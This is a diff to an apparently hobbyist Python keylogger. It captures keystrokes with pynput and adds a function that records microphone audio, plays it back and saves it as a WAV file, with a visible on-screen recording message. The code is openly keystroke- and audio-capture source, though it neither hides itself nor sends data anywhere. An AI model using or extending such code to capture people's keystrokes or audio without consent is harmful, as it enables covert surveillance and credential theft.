@@ -1,12 +1,43 @@
 #!/bin/python
 
+#-----------Imports
+
+#For basic keylogging
 import pynput
 from pynput.keyboard import Key, Listener
+
+#For microphone
+import sounddevice as sd
+import numpy as np
+import scipy.io.wavfile as wav
+from scipy.io.wavfile import write
+
+#For the little animations
+import sys, time, itertools
+#-------------------
+
+#------------Variables
+
+#For basic keylogging
 
 count = 0 #If the user is somehow able to break out of the program, after the user hits a certain amount of keys, the user will be able to add the data into the files
 count_space = 0
 keys = []
 
+#For microphone
+microphone_time = 5
+
+audio_information = "audio.wav"
+file_path = "/home/yoshi/Desktop/Projects/Mini/keylogger"
+extend = "/"
+
+#For the dot animation
+count = 0
+
+
+#----------------------
+
+#Basic Keylogging
 #Listener is what listens to the key events
 
 def on_press(key):
@@ -53,3 +84,40 @@ def on_release(key):
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join() #This loop is constantly run till we exit from it
+
+#The basic dot animation
+def animate():
+    global count
+    for c in itertools.cycle(['.', '..', '...','   ']):
+        if count == 10:
+            break
+        sys.stdout.write('\rRecording audio' + c)
+        time.sleep(1) 
+        count += 1
+       
+    for x in range(0, 3):
+        sys.stdout.write('\rRecording Complete!')
+        time.sleep(0.5)
+        sys.stdout.write('\r                   ')
+        time.sleep(0.5)
+
+#Collecting and storing the audio
+
+
+def microphone():
+    fs = 44100
+    duration = microphone_time
+    
+    myrecording = sd.rec(int(duration*fs), samplerate=fs, channels=2)
+
+    animate()
+
+    sd.wait()
+
+    sd.play(myrecording, fs)
+    sd.wait()
+    print("\nPlaying audio complete")
+
+    write(file_path + extend + audio_information, fs, myrecording)
+
+microphone()
